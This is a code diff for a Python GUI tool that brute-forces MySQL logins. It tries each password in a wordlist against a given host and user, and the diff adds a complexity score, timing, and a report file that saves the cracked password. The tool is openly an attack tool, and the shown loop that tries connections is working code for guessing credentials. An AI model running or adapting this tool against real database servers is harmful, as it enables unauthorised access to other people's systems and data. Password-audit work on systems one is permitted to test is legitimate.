@@ -11,12 +11,23 @@ logging.basicConfig(filename='baobab_errors.log', level=logging.ERROR, format='%
 
 # Fonction pour classifier la complexité d'un mot de passe
 def classify_password(password):
-    if re.match(r"^(?=.*[0-9])(?=.*[!?@#$%^&*])[a-zA-Z0-9!?@#$%^&*]{2,}$", password):
-        return "[High]"
-    elif re.match(r"^(?=.*[0-9])[a-zA-Z0-9]{2,}$", password):
-        return "[Medium]"
-    else:
-        return "[Low]"
+    complexity_score = 0
+    if re.search("[a-z]", password):
+        complexity_score += 1
+    if re.search("[A-Z]", password):
+        complexity_score += 1
+    if re.search("[0-9]", password):
+        complexity_score += 1
+    if re.search("[!?@#$%^&*]", password):
+        complexity_score += 2
+    complexity_score += len(password) // 8
+    return min(complexity_score, 5)
+
+def write_report(duration, password, complexity_level):
+    with open("baobab_report.txt", 'a') as file:
+        file.write(f"Bruteforce duration: {duration} seconds\n")
+        file.write(f"Found password: {password}\n")
+        file.write(f"Password complexity: {complexity_level}/5\n\n")
 
 class BruteForceSQL:
     def __init__(self, host, user, wordlist_path, output_label, output_area, progress_bar):
@@ -39,6 +50,7 @@ class BruteForceSQL:
             self.thread.join()
 
     def brute_force(self):
+        start_time = time.time()
         try:
             with open(self.wordlist_path, 'r', encoding='utf-8') as file:
                 passwords = file.readlines()
@@ -50,13 +62,16 @@ class BruteForceSQL:
                 password = password.strip()
 
                 progress =  (index / total_lines) * 100
-                self.update_gui(f"Attempt {index}/{total_lines}: {password}", progress)
+                self.update_gui(f"Attempt n°{index}/{total_lines}: {password}", progress)
 
                 try:
                     connection =  mysql.connector.connect(host=self.host, user=self.user, password=password)
                     if connection.is_connected():
                         connection.close()
-                        self.update_gui(f"Password found: {password}, Complexity: {classify_password(password)}", 100)
+                        end_time = time.time()
+                        complexity_level = classify_password(password)
+                        self.update_gui(f"Found password: {password} | Password complexity: {complexity_level}", 100)
+                        write_report(end_time - start_time, password, complexity_level)
                         break
                 except mysql.connector.Error as e:
                     logging.error(f"MySQL error: {e}")
